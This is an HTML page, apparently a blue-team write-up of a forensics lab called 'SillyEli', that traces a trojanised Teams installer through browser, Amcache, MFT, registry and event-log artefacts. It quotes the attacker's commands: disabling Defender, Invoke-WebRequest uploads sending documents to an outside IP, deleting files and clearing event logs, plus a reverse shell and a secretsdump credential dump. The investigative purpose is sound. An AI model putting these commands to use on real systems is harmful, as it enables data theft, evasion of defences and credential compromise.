@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="index, follow">
+    <title>SillyEli - Hexicon Archives</title>
+    <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
+    <link rel="stylesheet" href="../style.css">
+    <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/sherlocks/SillyEli.html" />
+    <!-- Sherlock-specific metadata for SEO -->
+    <meta name="description" content="Writeup for SillyEli sherlock - Hard difficulty level">
+    <meta name="keywords" content="Sherlock, SillyEli, Hard, Blue Team, writeup, cybersecurity, threat hunting, Hexicon">
+</head>
+<body>
+    <header>
+        <div class="container header-content">
+            <a href="../sherlocks.html" class="logo">Sherlock writeups</a>
+            <div class="header-controls">
+                <a href="../index.html" class="htb-icon" title="Link to the main page">
+                    <img src="../favicon.png" alt="Archive" width="30" height="30">
+                </a>
+                <div class="hamburger-menu">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+        </div>
+    </header>
+    
+    <div class="sidebar">
+        <div class="difficulty-buttons">
+            <button class="difficulty-btn" data-difficulty="veasy">VEasy</button>
+            <div class="sherlock-list" id="veasy-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+
+            <button class="difficulty-btn" data-difficulty="easy">Easy</button>
+            <div class="sherlock-list" id="easy-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="medium">Medium</button>
+            <div class="sherlock-list" id="medium-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="hard">Hard</button>
+            <div class="sherlock-list" id="hard-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+
+            <button class="difficulty-btn" data-difficulty="insane">Insane</button>
+            <div class="sherlock-list" id="insane-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+        </div>
+    </div>
+    
+    <div class="backdrop"></div>
+    
+    <main class="container writeup-content">
+        <h1 class="writeup-title">SillyEli</h1>
+        <div class="writeup-metadata">
+            <span class="difficulty hard">Hard</span>
+            <span class="date">April 2, 2026</span>
+        </div>
+        
+        <div class="writeup-container">
+            <div class="writeup-body">
+                <!-- Sherlock-specific content goes here -->
+                <p><img alt="solved" src="../images/SillyEli/solved.png" /></p>
+<pre class="codehilite"><code>Eli, a recent addition to the IT team, is eager to settle into his new role. Due to the company's flexible &quot;Bring Your Own Device&quot; (BYOD) policy, which applies to everyone except IT administrators, Eli receives a newly prepared PC from Metushelah, the senior IT administrator, as part of the IT team's secure device protocol.
+Eli's first priority is to install essential applications that will enable him to connect seamlessly with the rest of the team. He begins setting up the system and downloading the necessary software. After a few days on the job, Eli starts noticing something unusual: every so often, a PowerShell window flashes on his screen, disappearing almost instantly, too quickly to read any of its contents.
+Assuming it's just a minor glitch, Eli continues with his work. However, as the unexpected PowerShell pop-ups persist, Eli decides to consult Metushelah. Metushelah suspects these PowerShell flashes could indicate malicious activity.
+To ensure there are no security breaches, he conducts a forensic acquisition of Eli's PC and forwards it to the Incident Response team for further analysis. Now, as a member of the IR team, your mission is to investigate Eli's workstation.
+</code></pre>
+
+<h1>Task 1</h1>
+<p><code>Identify the specific time the malware was downloaded in UTC.</code></p>
+<p>I'll start off by checking what browsers Eli has available on his system.</p>
+<p><img alt="browsers" src="../images/SillyEli/browsers.png" /></p>
+<p>Chrome, Edge, and Mozilla. Going by the size, Chrome's History DB is the biggest, followed by Edge. As for Mozilla's <code>places.sqlite</code> DB, I could not find it, so I'll assume Eli has not used it at all.</p>
+<p>I'll investigate Chrome's downloads first, as the History DB is the biggest.</p>
+<p><code>SQLECmd.exe -f "C:\Users\malware\Desktop\Acquisition\C\Users\Eli\AppData\Local\Google\Chrome\User Data\Default\History" --csv chromesqlout</code></p>
+<p><img alt="chrome" src="../images/SillyEli/chrome.png" /></p>
+<p>The last thing Eli has downloaded via Chrome is a Firefox installer... During the earlier search for the Firefox DB, I looked into the <code>AppData\Local</code> directory, which contained empty profiles...</p>
+<p><img alt="roaming" src="../images/SillyEli/roaming.png" /></p>
+<p>But the DB was located under <code>AppData\Roaming</code> instead! The size itself confirms that this DB is full of data, so I'll do the exact same thing I just did with Chrome.</p>
+<p><code>SQLECmd.exe -f "C:\Users\malware\Desktop\Acquisition\C\Users\Eli\AppData\Roaming\Mozilla\Firefox\Profiles\sq1wae60.default-release\places.sqlite" --csv firefoxsqlout</code></p>
+<p><img alt="download" src="../images/SillyEli/download.png" /></p>
+<p>There is only one file in the Firefox download history.</p>
+<p><img alt="task1" src="../images/SillyEli/task1.png" /></p>
+<h1>Task 2</h1>
+<p><code>Which domain name was the file downloaded from?</code></p>
+<p>Let's correlate the discovered data with the visit history from the same database.</p>
+<p><img alt="bucket" src="../images/SillyEli/bucket.png" /></p>
+<p>The file was downloaded from an Amazon S3 bucket. The visit count being 0 just means that this was the first time ELi had visited that bucket. One more interesting thing is the visit type, which is <code>TRANSITION_REDIRECT_TEMPORARY</code></p>
+<p>Looking through the web for what that could mean, I found a resource that contains useful information and queries for the Firefox DB.</p>
+<p><a href="https://gist.github.com/olejorgenb/9418bef65c65cd1f489557cfc08dde96">https://gist.github.com/olejorgenb/9418bef65c65cd1f489557cfc08dde96</a></p>
+<p>From this, I can tell that the user got redirected to the bucket temporarily, which then resulted in the malware's download.</p>
+<p>Regardless, the answer to question 2 will be <code>filesuneedtodownload.s3.eu-north-1.amazonaws.com</code></p>
+<p><img alt="task2" src="../images/SillyEli/task2.png" /></p>
+<h1>Task 3</h1>
+<p><code>Identify the SHA-1 hash of the malware.</code></p>
+<p>There are 3 ways I can think of off the top of my head to get the SHA-1 hash of a known malware.</p>
+<ol>
+<li>Browse the Amcache.hve file</li>
+<li>Look for Windows Defender's action logs</li>
+<li>Try to extract the malware and chuck it into VirusTotal</li>
+</ol>
+<p>I'll start with the 1st option. If the malware was executed on the system, it will have its own entry in the hive.</p>
+<p>As for what Amcache is, it's a system registry hive used to store metadata about executed programs, installed applications, and loaded drivers. This is a goldmine for forensics because it allows us to see full paths of executables, provides loaded drivers and DLLs, timestamps, and, most importantly, in the current case, SHA-1 hashes for comparison against public malware databases like VT.</p>
+<p><code>AmcacheParser.exe -f "C:\Users\malware\Desktop\Acquisition\C\Windows\AppCompat\Programs\Amcache.hve" --csv amcacheout</code></p>
+<p>I'll filter for the name <code>Teams</code> to find the malicious entry quicker.</p>
+<p><img alt="sha1" src="../images/SillyEli/sha1.png" /></p>
+<p>The answer to question 3 will be <code>de733beed85f39605fcdea42dddee190506424f2</code></p>
+<p><img alt="task3" src="../images/SillyEli/task3.png" /></p>
+<h1>Task 4</h1>
+<p><code>It looks like malicious tool attempts to download a secondary tool during execution — find and provide the full URL.</code></p>
+<p>The executable's presence in the Amcache hive 100% confirms that it was indeed executed. If whatever it tried to download is a well-known tool, there is a good chance that Windows Defender caught it and mitigated the danger.</p>
+<p><img alt="detect" src="../images/SillyEli/detect.png" /></p>
+<p>There are quite a few files in the support directory. I'll focus on the entire logfile, since I know the malware's name.</p>
+<p><img alt="found" src="../images/SillyEli/found.png" /></p>
+<p>The malware's execution almost immediately catches Defender's attention, and AMSI (Anti-Malware Scan Interface) quickly hooks into the process to scan for suspicious actions.</p>
+<p><img alt="detected" src="../images/SillyEli/detected.png" /></p>
+<p>An attempt to download Mimikatz was made and quickly foiled by Defender. The original malware remained unharmed, though, from what it looks like.</p>
+<p>It's also worth remembering that certutil was used to download the archive, which could help me in future searches if more files were downloaded.</p>
+<p><img alt="task4" src="../images/SillyEli/task4.png" /></p>
+<h1>Task 5</h1>
+<p><code>What is the name of the batch file created on the system as part of the malware execution?</code></p>
+<p>For this task, I will parse the $MFT and $UsnJournal journals. For the filtering, I will use the malware's execution time, desired file extensions(.bat), and the update reason(FileCreate).</p>
+<p><code>MFTECmd.exe -f "C:\Users\malware\Desktop\Acquisition\C\$Extend\$J" -m "C:\Users\malware\Desktop\Acquisition\C\$MFT" --csv journalout</code></p>
+<p>My filter for Timeline Explorer will be like this:</p>
+<p><code>[Update Timestamp] &gt;= #2024-11-06 01:58:14# And Contains([Update Reasons], 'FileCreate') And Contains([Extension], '.bat')</code></p>
+<p><img alt="batch" src="../images/SillyEli/batch.png" /></p>
+<p>The batch file in question is <code>TeamsUpdater.bat</code></p>
+<p><img alt="task5" src="../images/SillyEli/task5.png" /></p>
+<h1>Task 6</h1>
+<p><code>What was the runtime duration of the malware? (Duration in Ms)</code></p>
+<p>To get the runtime duration of the malware, I will use the SRUDB (System Resource Usage Database). This DB tracks data like app activity, network usage, and more. The nice thing about this one is that it persists for a longer period than other logs, making it quite valuable from an analyst's perspective.</p>
+<p><code>SrumECmd.exe -f "C:\Users\malware\Desktop\Acquisition\C\Windows\System32\SRU\SRUDB.dat" -r "C:\Users\malware\Desktop\Acquisition\C\Windows\System32\config\SOFTWARE" --csv srumdbout</code></p>
+<p><img alt="out" src="../images/SillyEli/out.png" /></p>
+<p>This command results in the following files being created:</p>
+<pre class="codehilite"><code>04/01/2026  08:05 PM           211,174 20260402030527_SrumECmd_AppResourceUseInfo_Output.csv
+04/01/2026  08:05 PM           172,942 20260402030527_SrumECmd_AppTimelineProvider_Output.csv
+04/01/2026  08:05 PM               392 20260402030527_SrumECmd_EnergyUsage_Output.csv
+04/01/2026  08:05 PM               914 20260402030527_SrumECmd_NetworkConnections_Output.csv
+04/01/2026  08:05 PM            51,681 20260402030527_SrumECmd_NetworkUsages_Output.csv
+04/01/2026  08:05 PM             1,577 20260402030527_SrumECmd_PushNotifications_Output.csv
+04/01/2026  08:05 PM            10,541 20260402030527_SrumECmd_vfuprov_Output.csv
+</code></pre>
+
+<p>From which I will look at the AppTimeline file first.</p>
+<p><img alt="duration" src="../images/SillyEli/duration.png" /></p>
+<p>The duration value tells us for how long the malware was running on the system in milliseconds. The answer to that is <code>60003</code></p>
+<p><img alt="task6" src="../images/SillyEli/task6.png" /></p>
+<h1>Task 7</h1>
+<p><code>Locate the local URL cache and identify the full URL the threat actor used to download an additional tool during the attack. Include the complete URL with filename and extension.</code></p>
+<p>"Local URL cache" could mean either a cache from one of the browsers, a DNS cache, or a bunch of other things as well. I know that the attacker wanted to transfer files onto the system via certutil earlier, so I'll look into the CryptNetURLCache directory.</p>
+<p><code>C:\Users\malware\Desktop\Acquisition\C\Users\Eli\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData</code></p>
+<p>The MetaData directory contains metadata of files downloaded via certutil, such as URLs they were downloaded from.</p>
+<p><img alt="filebin" src="../images/SillyEli/filebin.png" /></p>
+<p>There is a single HTTPS URL in the cached metadata, which corresponds to a file-sharing website. The attacker seems to have downloaded... KAPE? This looks a bit unusual, but it might just be a prepared malicious archive named like that to look legitimate to analysts.</p>
+<p><img alt="task7" src="../images/SillyEli/task7.png" /></p>
+<h1>Task 8</h1>
+<p><code>What is the name of the scheduled task that the attacker created for persistence?</code></p>
+<p>The KAPE archive is actually just a legitimate download... I confirmed this by correlating the name from metadata with files in content, and renaming the proper file to kape.zip.</p>
+<p>Back to question 8, the usual spot I look into for schtasks is the Tasks directory under the system root.</p>
+<p><img alt="missing" src="../images/SillyEli/missing.png" /></p>
+<p>This directory does not exist in this case, but there is a different way to check for schtasks on a system.</p>
+<pre class="codehilite"><code>RECmd.exe -f &quot;C:\Users\malware\Desktop\Acquisition\C\Windows\System32\config\SOFTWARE&quot; --kn &quot;Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tasks&quot;
+
+RECmd.exe -f &quot;C:\Users\malware\Desktop\Acquisition\C\Windows\System32\config\SOFTWARE&quot; --kn &quot;Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tree&quot;
+</code></pre>
+
+<p>The difference between these 2 keys is that the first one shows GUIDs, while the latter shows actual named tasks.</p>
+<p><img alt="tasks" src="../images/SillyEli/tasks.png" /></p>
+<p>This TeamsUpdater task has its last write time matching the attacker's timestamps. This will be the answer to question 8.</p>
+<p><img alt="task8" src="../images/SillyEli/task8.png" /></p>
+<h1>Task 9</h1>
+<p><code>What is the unique GUID associated with the malicious scheduled task?</code></p>
+<p>I'll read further into the malicious task.</p>
+<p><code>RECmd.exe -f "C:\Users\malware\Desktop\Acquisition\C\Windows\System32\config\SOFTWARE" --kn "Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tree\TeamsUpdater"</code></p>
+<p><img alt="malicious" src="../images/SillyEli/malicious.png" /></p>
+<p>The GUID in question is <code>{A4F7ED3E-E7CD-4539-8E79-D73B568FC298}</code></p>
+<p><img alt="task9" src="../images/SillyEli/task9.png" /></p>
+<h1>Task 10</h1>
+<p><code>Identify the process or command executed by the malicious scheduled task.</code></p>
+<p>Knowing the GUID from the previous task will come in handy here, as more information is stored under the Tasks subkey under the very same GUIDs.</p>
+<p><code>RECmd.exe -f "C:\Users\malware\Desktop\Acquisition\C\Windows\System32\config\SOFTWARE" --kn "Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tasks\{A4F7ED3E-E7CD-4539-8E79-D73B568FC298}"</code></p>
+<p><img alt="binary" src="../images/SillyEli/binary.png" /></p>
+<p>The data I want is encoded within these RegBinary blobs. I've done a similar decoding process while solving [Whisper] a few weeks ago, but I don't feel like doing that manually right now. I'll run RegistryExplorer with the SOFTWARE hive loaded, and I'll navigate to the GUID.</p>
+<p><img alt="decoded" src="../images/SillyEli/decoded.png" /></p>
+<p>RegistryExplorer automatically decodes the Actions blob, but struggles with the Triggers. That's not too relevant right now, but it would be cool to know what fires off the task.</p>
+<p>Regardless, the command executed by the schtask is <code>powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Eli\AppData\Local\Temp\Teams.ps1</code></p>
+<p><img alt="task10" src="../images/SillyEli/task10.png" /></p>
+<h1>Task 11</h1>
+<p><code>Identify the attacker's IP address and port.</code></p>
+<p>I'll take a look at the $MFT journal, looking for the .ps1 file specifically.</p>
+<p><img alt="nice" src="../images/SillyEli/nice.png" /></p>
+<p>The <code>in use</code> flag indicates that the file was being used at the time of the journal's capture. It is also relatively small, so I'll try to recover its contents with MFTECmd.exe.</p>
+<p><code>MFTECmd.exe -f "C:\Users\malware\Desktop\Acquisition\C\$MFT" --de 315567-1</code></p>
+<p><img alt="recover" src="../images/SillyEli/recover.png" /></p>
+<p>A base64 string is decoded, decompressed(important), read as ASCII, and passed to IEX to execute whatever it decodes to. I'll create a CyberChef recipe in accordance with the PS snippet, so that I can see what the encoded string truly is.</p>
+<p><img alt="revshell" src="../images/SillyEli/revshell.png" /></p>
+<p>This is a reverse shell command! It connects to <code>192.168.137.132:443</code>, creates a loop to read commands from the attacker, executes said commands, and sends back results to the attacker. Port 443 is often used for revshells because it can blend well with normal HTTPS traffic.</p>
+<p><img alt="task11" src="../images/SillyEli/task11.png" /></p>
+<h1>Task 12</h1>
+<p><code>What is the name of the sensitive file exfiltrated by the threat actor?</code></p>
+<p>Since the revshell comes from a PowerShell process, the commands executed might have been logged in the user's PowerShell console history.</p>
+<p><code>C:\Users\malware\Desktop\Acquisition\C\Users\Eli\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_History.txt</code></p>
+<pre class="codehilite"><code>whoami
+hostname
+net user
+net user Eli
+findstr /s /i /m &quot;mimikatz&quot; &quot;C:\Users\Eli\Documents\*&quot;
+Get-MpPreference | Select-Object -Property DisableRealtimeMonitoring
+Set-MpPreference -DisableRealtimeMonitoring $true
+Get-MpPreference | Select-Object -Property DisableRealtimeMonitoring
+findstr /s /i /m &quot;password&quot; .docx.doc .pdf.pptx
+findstr /s /i /m &quot;sensitive&quot; .docx.doc .pdf.pptx
+Get-ChildItem -Path C:\ -Include *.pdf, *.doc, *.docx -Recurse -ErrorAction SilentlyContinue
+cd C:\Users\Eli\Documents
+ls
+type &quot;Meeting Notes.txt&quot;
+Invoke-WebRequest -Uri &quot;http://91.240.118.162:8080/&quot; -Method Post -InFile &quot;C:\Users\Eli\Documents\Employees_Contact_Info.pdf&quot; -ContentType &quot;application/octet-stream&quot;;
+Invoke-WebRequest -Uri &quot;http://91.240.118.162:8080/&quot; -Method Post -InFile &quot;C:\Users\Eli\Documents\IT_Collaboration_Platform.pptx&quot; -ContentType &quot;application/octet-stream&quot;;
+Remove-Item -Path &quot;C:\Users\Eli\Documents\Employees_Contact_Info.pdf&quot; -Force
+Remove-Item -Path &quot;C:\Users\Eli\Documents\IT_Collaboration_Platform.pptx&quot; -Force
+ls
+Get-EventLog -LogName * | ForEach-Object { Clear-EventLog -LogName $_.Log }
+</code></pre>
+
+<p>Two files were exfiltrated in total.</p>
+<p><img alt="task12" src="../images/SillyEli/task12.png" /></p>
+<h1>Task 13</h1>
+<p><code>Based on the contents of the document, what is Metushelah’s email address?</code></p>
+<p>This question led me on quite a journey. The files were deleted and were not present in the $MFT journal, meaning I could not just recover them like that. I then moved on to the thumbcache files, which also did not provide me with anything.</p>
+<p>After abusing the method of elimination, I was left with the Windows Search Index DB at <code>C:\ProgramData\Microsoft\Search\Data\Applications\Windows\Windows.edb</code></p>
+<p><a href="https://www.nirsoft.net/utils/ese_database_view.html">https://www.nirsoft.net/utils/ese_database_view.html</a></p>
+<p><img alt="tables" src="../images/SillyEli/tables.png" /></p>
+<p>I started with the PropertyStore, as it was the biggest table in the DB. I used the PDF's full filename to find matching entries, until eventually...</p>
+<p><img alt="autosummary" src="../images/SillyEli/autosummary.png" /></p>
+<p>An entry with a different DateModified value had the AutoSummary field filled with the test below:</p>
+<p><code>Company Employees Information First Name Last Name Employee ID Username Email Address Role Seraphina Thorne 19035287 sthorne sthorne36@privmail.net Support Specialist [...] AI Researcher Metushelah Makorelah 57054553 mkorelah balikvar@laffa.com IT Administrator</code>og?`</p>
+<p>Metushelah's email address is visible in the field.</p>
+<p><img alt="task13" src="../images/SillyEli/task13.png" /></p>
+<h1>Task 14</h1>
+<p><code>At what time did the attacker clear the Windows event logs? (in UTC)</code></p>
+<p>The event I'm looking for is <code>1102</code> (Event log cleared). I'll use EvtxECmd to parse the Security.evtx file, which will then be passed into Timeline Explorer.</p>
+<p><code>EvtxECmd.exe -f "C:\Users\malware\Desktop\Acquisition\C\Windows\System32\winevt\logs\Security.evtx" --csv evtxout</code></p>
+<p><img alt="single" src="../images/SillyEli/single.png" /></p>
+<p>There is only a single fitting event, which happened on <code>2024-11-06 02:16:50</code></p>
+<p><img alt="task14" src="../images/SillyEli/task14.png" /></p>
+<h1>Task 15</h1>
+<p><code>What is the name of the legitimate tool used by the threat actor to acquire the SAM and SYSTEM hives?</code></p>
+<p>Just as with task 13, this question stumped me for a good while. I looked through the event logs for process creation events tied to executables like reg.exe, looked for Volume Shadow copies, and could not find an answer...</p>
+<p>...That is, until I remembered that earlier, the attacker had downloaded KAPE for reasons unknown... Up to this point! KAPE is a legitimate tool used to gather forensic data... Which means that it WILL gather registry hives as well!</p>
+<p><img alt="task15" src="../images/SillyEli/task15.png" /></p>
+<h1>Task 16</h1>
+<p><code>Identify the password belonging to Eli’s account that were exfiltrated by the attacker to their C2 server.</code></p>
+<p>Easy task for the end. I'll run <code>secretsdump.py</code> against the local hives to extract hashes of every user on the machine.</p>
+<p><code>python secretsdump.py -system "C:\Users\malware\Desktop\Acquisition\C\Windows\System32\config\SYSTEM" -sam "C:\Users\malware\Desktop\Acquisition\C\Windows\System32\config\SAM" -security "C:\Users\malware\Desktop\Acquisition\C\Windows\System32\config\SECURITY" local</code></p>
+<p><img alt="hashes" src="../images/SillyEli/hashes.png" /></p>
+<p>Now all that's left to do is to crack the hash with hashcat.</p>
+<p><img alt="cracked" src="../images/SillyEli/cracked.png" /></p>
+<p><code>eli | blackrose</code></p>
+<p><img alt="task16" src="../images/SillyEli/task16.png" /></p>
+<p>Solved!</p>
+            </div>
+            
+            <div class="toc-sidebar">
+                <h3>Contents</h3>
+                <ul id="toc-list">
+                    <!-- This will be populated by JavaScript -->
+                </ul>
+            </div>
+        </div>
+    </main>
+    
+    <!-- Mobile TOC toggle button -->
+    <button class="toc-toggle" aria-label="Toggle table of contents">
+        ≡
+    </button>
+    
+    <footer>
+        <div class="container">
+            <p>&copy; 2026 Hexicon Archives | Created by Hexicon</p>
+        </div>
+    </footer>
+
+    <!-- Include the Markdown parser (not needed for static HTML) -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/marked/4.3.0/marked.min.js"></script>
+    
+    <script>
+        // Sherlock metadata for sidebar population
+        let sherlockData = {};
+        
+        // Function to initialize the application
+        async function initializeApp() {
+            try {
+                // Fetch sherlock metadata
+                const response = await fetch('../sherlocks.json');
+                if (!response.ok) {
+                    throw new Error('Failed to load sherlock metadata');
+                }
+                sherlockData = await response.json();
+                
+                // Populate the sidebar with sherlock links
+                populateSidebar();
+                
+                // Generate table of contents
+                generateTableOfContents();
+            } catch (error) {
+                console.error('Initialization error:', error);
+                showError("Failed to initialize application. Please refresh and try again.");
+            }
+        }
+
+        // Call the initialization function when the page loads
+        document.addEventListener('DOMContentLoaded', initializeApp);
+
+        // Populate sidebar with sherlock links dynamically
+        function populateSidebar() {
+            const categories = {
+                "veasy": document.getElementById("veasy-sherlocks"),
+                "easy": document.getElementById("easy-sherlocks"),
+                "medium": document.getElementById("medium-sherlocks"),
+                "hard": document.getElementById("hard-sherlocks"),
+                "insane": document.getElementById("insane-sherlocks")
+            };
+
+            // Clear existing links
+            for (const category of Object.values(categories)) {
+                category.innerHTML = '';
+            }
+
+            // Add sherlock links to appropriate categories
+            for (const [sherlockName, data] of Object.entries(sherlockData)) {
+                const difficulty = data.difficulty.toLowerCase();
+                if (categories[difficulty]) {
+                    const link = document.createElement('a');
+                    link.href = `../sherlocks/${sherlockName}.html`;
+                    link.textContent = data.title;
+                    
+                    // Highlight current sherlock
+                    if (data.title === "SillyEli") {
+                        link.classList.add('active');
+                    }
+                    
+                    categories[difficulty].appendChild(link);
+                }
+            }
+        }
+
+        // Generate table of contents from headings
+        function generateTableOfContents() {
+            const writeupBody = document.querySelector('.writeup-body');
+            const tocList = document.getElementById('toc-list');
+            const headings = writeupBody.querySelectorAll('h1, h2, h3');
+            
+            // Clear existing TOC
+            tocList.innerHTML = '';
+            
+            headings.forEach((heading, index) => {
+                // Create an ID for the heading if it doesn't have one
+                if (!heading.id) {
+                    // Convert heading text to kebab-case for ID
+                    const headingText = heading.textContent.trim();
+                    const headingId = headingText
+                        .toLowerCase()
+                        .replace(/[^\w\s-]/g, '')
+                        .replace(/\s+/g, '-');
+                    
+                    heading.id = headingId || `section-${index}`;
+                }
+                
+                // Create a list item for the TOC
+                const listItem = document.createElement('li');
+                const link = document.createElement('a');
+                link.href = `#${heading.id}`;
+                link.textContent = heading.textContent;
+                
+                // Add a class for h2 elements to create indentation
+                if (heading.tagName === 'H2') {
+                    listItem.classList.add('sub-heading');
+                    listItem.style.paddingLeft = '15px';
+                } else if (heading.tagName === 'H3') {
+                    listItem.classList.add('sub-sub-heading');
+                    listItem.style.paddingLeft = '30px';
+                }
+                
+                listItem.appendChild(link);
+                tocList.appendChild(listItem);
+            });
+            
+            // Set up scroll highlighting
+            setupScrollHighlighting();
+        }
+
+        // Highlight active TOC section on scroll
+        function setupScrollHighlighting() {
+            const tocLinks = document.querySelectorAll('.toc-sidebar a');
+            
+            function highlightActiveSection() {
+                // Find which section is currently in view
+                const fromTop = window.scrollY + 120;
+                
+                tocLinks.forEach(link => {
+                    const section = document.querySelector(link.hash);
+                    
+                    if (section && 
+                        section.offsetTop <= fromTop &&
+                        section.offsetTop + section.offsetHeight > fromTop) {
+                        link.classList.add('active');
+                    } else {
+                        link.classList.remove('active');
+                    }
+                });
+            }
+            
+            // Call initially and on scroll
+            window.addEventListener('scroll', highlightActiveSection);
+            highlightActiveSection();
+        }
+
+        // Show error message
+        function showError(message) {
+            const contentArea = document.querySelector('.writeup-body');
+            contentArea.innerHTML = `
+                <div class="error-message">
+                    <h2>Error</h2>
+                    <p>${message}</p>
+                </div>
+            `;
+        }
+
+        // Initialize the page
+        document.addEventListener('DOMContentLoaded', function() {
+            // Hamburger menu functionality
+            const hamburgerMenu = document.querySelector('.hamburger-menu');
+            const sidebar = document.querySelector('.sidebar');
+            const backdrop = document.querySelector('.backdrop');
+            
+            hamburgerMenu.addEventListener('click', () => {
+                hamburgerMenu.classList.toggle('active');
+                sidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            backdrop.addEventListener('click', () => {
+                hamburgerMenu.classList.remove('active');
+                sidebar.classList.remove('active');
+                backdrop.classList.remove('active');
+                tocSidebar.classList.remove('active');
+            });
+            
+            // Difficulty buttons functionality
+            const difficultyButtons = document.querySelectorAll('.difficulty-btn');
+            
+            difficultyButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const difficulty = button.getAttribute('data-difficulty');
+                    const sherlockList = document.querySelector(`#${difficulty}-sherlocks`);
+                    
+                    sherlockList.classList.toggle('active');
+                });
+            });
+            
+            // Mobile TOC toggle
+            const tocToggle = document.querySelector('.toc-toggle');
+            const tocSidebar = document.querySelector('.toc-sidebar');
+            
+            tocToggle.addEventListener('click', () => {
+                tocSidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            // Close TOC sidebar when clicking on a link (mobile)
+            document.querySelectorAll('.toc-sidebar a').forEach(link => {
+                link.addEventListener('click', () => {
+                    if (window.innerWidth <= 1024) {
+                        tocSidebar.classList.remove('active');
+                        backdrop.classList.remove('active');
+                    }
+                });
+            });
+        });
+
+        // Add smooth scrolling for TOC links
+        document.addEventListener('click', function(e) {
+            if (e.target.tagName === 'A' && e.target.hash) {
+                const element = document.querySelector(e.target.hash);
+                if (element) {
+                    e.preventDefault();
+                    window.scrollTo({
+                        top: element.offsetTop - 90,
+                        behavior: 'smooth'
+                    });
+                }
+            }
+        });
+    </script>
+</body>
+</html>
